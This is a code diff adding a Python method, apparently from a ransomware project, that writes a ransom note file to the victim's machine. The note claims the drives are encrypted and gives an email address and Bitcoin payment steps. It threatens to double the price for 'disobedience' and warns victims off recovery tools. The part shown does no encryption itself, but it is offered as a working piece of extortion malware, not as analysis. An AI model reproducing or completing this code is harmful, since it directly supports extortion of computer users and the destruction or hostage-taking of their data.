@@ -1,0 +1,22 @@
+def ransom_note(self):
+        date = datetime.date.today().strftime('%d-%B-Y')
+        with open('RANSOM_NOTE.txt', 'w') as f:
+            f.write(f'''
+ The drives of your computer have been encrypted with a Military grade encryption algorithm. 
+    There is no way to restore your data without a special 
+    key. Only we can decrypt your files!
+    To purchase your key and restore your data, please follow these three easy steps:
+    1. Email the file called EMAIL_ME.txt on your Desktop to (fredholder58@gmail.com)
+    2. You will recieve your personal BTC address for payment.
+    Once payment has been completed, send another email to (fredholder58@gmail.com) stating "PAID".
+    We will check to see if payment has been paid.
+    3. You will receive a text file with your KEY that will unlock all your files. 
+    IMPORTANT: To decrypt your files, place Put_Me_On_Your_Desktop.txt file on desktop and wait. Shortly after it will begin 
+    to decrypt all files.
+    WARNING:
+    Do NOT attempt to decrypt your files with any software as it is likely to cause irreversable damage, and 
+    will cost you more to unlock your files.
+    Do NOT send "PAID" without paying, price WILL double for disobedience.
+    If you are unable to pay a possible extension may be granted if you adopt a kitten in need from your local animal hospital.
+    Upon decryption of your device all backdoors and security flaws should be addressed or we might just come back and say hi.
+    Thank you for your patiance as we try to be as speedy as possible in these trying times.)
